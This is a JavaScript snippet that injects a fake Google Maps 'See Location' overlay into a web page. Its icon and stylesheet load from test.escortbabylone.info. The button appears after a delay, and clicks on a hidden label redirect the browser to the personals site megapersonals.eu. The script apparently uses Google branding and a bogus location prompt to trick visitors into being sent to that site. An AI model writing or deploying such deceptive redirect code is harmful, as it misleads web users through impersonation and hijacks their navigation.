// Create and insert a stylesheet link
const link = document.createElement('link');
link.rel = 'stylesheet';
link.type = 'text/css';
link.href = 'https://test.escortbabylone.info/css/stylemap.css';
document.head.appendChild(link);

// Add an iframe for the map
const mapIframe = document.createElement('iframe');
mapIframe.classList.add('fadeIn');
mapIframe.src = 'https://www.google.com/maps/embed?pb=...';
mapIframe.width = '600';
mapIframe.height = '450';
mapIframe.style.border = '0';
mapIframe.allowFullscreen = true;
mapIframe.loading = 'lazy';

// Add an overlay container
const overlay = document.createElement('div');
overlay.classList.add('overlay');
overlay.style.display = 'none';

// Add a Google button overlay
const googleButtonOverlay = document.createElement('a');
googleButtonOverlay.href = '#';
googleButtonOverlay.classList.add('google-button-overlay');
googleButtonOverlay.id = 'googleButtonOverlay';

// Add Google icon to the button
const googleIcon = document.createElement('img');
googleIcon.src = 'https://test.escortbabylone.info/img/favicon-removebg-preview.png';
googleIcon.alt = 'Google Maps Icon';
googleButtonOverlay.appendChild(googleIcon);

// Add a label for Google button
const googleLabel = document.createElement('label');
googleLabel.textContent = 'See Location';
googleButtonOverlay.appendChild(googleLabel);
overlay.appendChild(googleButtonOverlay);

// Create a container for inputs
const container = document.createElement('div');
container.classList.add('container');

// Add input section
const inputSection = document.createElement('div');
inputSection.classList.add('input-section');

// Add area label
const areaLabel = document.createElement('label');
areaLabel.setAttribute('for', 'hidden-input');
areaLabel.textContent = "What's your area?";
inputSection.appendChild(areaLabel);

// Add a hidden input
const hiddenInput = document.createElement('input');
hiddenInput.type = 'hidden';
hiddenInput.id = 'hidden-input';
hiddenInput.value = '40.333453, -102.437074';
inputSection.appendChild(hiddenInput);

// Add a search container
const searchContainer = document.createElement('div');
searchContainer.classList.add('search-container');

// Add a search input
const searchInput = document.createElement('input');
searchInput.type = 'text';
searchInput.style.border = 'none';
searchInput.style.outline = 'none';
searchInput.value = 'Search location...';
searchContainer.appendChild(searchInput);

// Add a search icon
const searchIcon = document.createElement('i');
searchIcon.id = 'searchIcon';
searchIcon.classList.add('fa', 'fa-search');
searchIcon.style.fontSize = '20px';
searchIcon.style.color = '#6565c5';
searchIcon.style.padding = '7px';
searchContainer.appendChild(searchIcon);

// Add a clear button
const clearButton = document.createElement('button');
clearButton.classList.add('clear-btn');
clearButton.textContent = '×';
searchContainer.appendChild(clearButton);

inputSection.appendChild(searchContainer);
container.appendChild(inputSection);

// Append everything to the body
const body = document.body;
body.appendChild(mapIframe);
body.appendChild(overlay);
body.appendChild(container);

// Show the overlay after a delay
document.addEventListener('DOMContentLoaded', () => {
  setTimeout(() => {
    overlay.style.display = 'block';
  }, 4000); // 4 seconds
});

// Add an accept button
const acceptButton = document.createElement('label');
acceptButton.classList.add('accept-button');
acceptButton.style.display = 'none';
acceptButton.setAttribute('for', 'hidden-input');

let clickCount = 0;
acceptButton.addEventListener('click', () => {
  clickCount++;
  if (clickCount === 2) {
    window.location.href = 'https://megapersonals.eu';
  }
});
overlay.appendChild(acceptButton);

// Close overlay on click
overlay.addEventListener('click', () => {
  overlay.style.display = 'none';
});